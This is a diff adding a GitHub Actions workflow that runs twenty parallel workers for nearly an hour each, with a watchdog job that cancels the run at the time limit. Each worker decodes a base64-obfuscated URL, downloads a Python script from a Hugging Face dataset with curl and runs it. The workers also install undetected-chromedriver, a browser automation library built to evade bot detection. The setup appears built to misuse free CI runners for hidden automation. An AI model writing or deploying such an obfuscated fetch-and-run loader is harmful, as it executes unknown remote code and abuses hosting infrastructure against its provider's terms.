@@ -1,0 +1,108 @@
+name: Nexus Automation Grid
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: grid-exec-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Core Watchdog: يراقب المدة الزمنية وينهي سير العمل عند انتهاء الوقت
+  # =================================================================
+  grid-watchdog:
+    name: "System Watchdog"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      MAX_EXEC_TIME: 3540
+    steps:
+      - name: Initialize Watchdog
+        run: |
+          echo "[SYSTEM] Watchdog initialized for process: ${{ github.run_id }}"
+          echo "[SYSTEM] Monitoring active run for ${MAX_EXEC_TIME} seconds."
+
+          sleep "${MAX_EXEC_TIME}"
+
+          echo "[SYSTEM] Threshold reached. Issuing global cancellation."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[SYSTEM] Cancellation payload sent successfully."
+
+  # =================================================================
+  # Execution Workers: تنفيذ بالتوازي عبر مصفوفة معالجة معرّفة
+  # =================================================================
+  worker-nodes:
+    name: "Worker-${{ matrix.node_code }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_code: [
+          "N-A01", "N-A02", "N-A03", "N-A04", "N-A05",
+          "N-B01", "N-B02", "N-B03", "N-B04", "N-B05",
+          "N-C01", "N-C02", "N-C03", "N-C04", "N-C05",
+          "N-D01", "N-D02", "N-D03", "N-D04", "N-D05"
+        ]
+
+    steps:
+      # -----------------------------------------------------------------
+      # المرحلة الأولى: تجهيز وتحديث البيئة
+      # -----------------------------------------------------------------
+      - name: Environment Setup
+        run: |
+          echo "[ENV] Preparing host environment for Node ${{ matrix.node_code }}..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # -----------------------------------------------------------------
+      # المرحلة الثانية: جلب ملف التشغيل من المصدر
+      # -----------------------------------------------------------------
+      - name: Fetch Executable Script
+        run: |
+          echo "[FETCH] Retrieving operational payload..."
+          TARGET_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$TARGET_URL" -o app_runner.py
+          echo "[FETCH] Script retrieved successfully."
+
+      # -----------------------------------------------------------------
+      # المرحلة الثالثة: تثبيت المكتبات البرمجية المطلوبة
+      # -----------------------------------------------------------------
+      - name: Install Runtime Dependencies
+        run: |
+          echo "[DEPS] Installing required Python packages..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # -----------------------------------------------------------------
+      # المرحلة الرابعة: بدء العملية الرئيسية مع مراقبة مدة التشغيل
+      # -----------------------------------------------------------------
+      - name: Execute Main Process
+        run: |
+          echo "[EXEC] Starting task execution on Worker-${{ matrix.node_code }}..."
+
+          python3 app_runner.py &
+          TASK_PID=$!
+
+          echo "[EXEC] Process spawned with PID: $TASK_PID. Timer set for 3540 seconds."
+
+          sleep 3540
+
+          if kill -0 "$TASK_PID" 2>/dev/null; then
+            echo "[EXEC] Timeout expired. Forcefully stopping background process..."
+            kill -9 "$TASK_PID"
+            echo "[EXEC] Process stopped."
+          else
+            echo "[EXEC] Task completed naturally prior to limit."
+          fi
